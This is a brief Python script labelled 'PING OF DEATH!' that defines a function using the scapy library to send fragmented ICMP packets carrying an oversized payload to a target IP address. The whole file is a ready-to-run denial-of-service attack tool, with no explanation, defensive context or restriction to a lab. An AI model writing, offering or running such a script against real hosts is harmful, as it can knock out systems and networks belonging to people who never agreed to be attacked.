#!/usr/bin/python
#PING OF DEATH!

import sys
from scapy.all import send, fragment, IP, ICMP


def POD(ip_addr, amt):
	send(fragment(IP(dst=ip_addr) / ICMP()  / ("X"*int(amt))))
	return 1
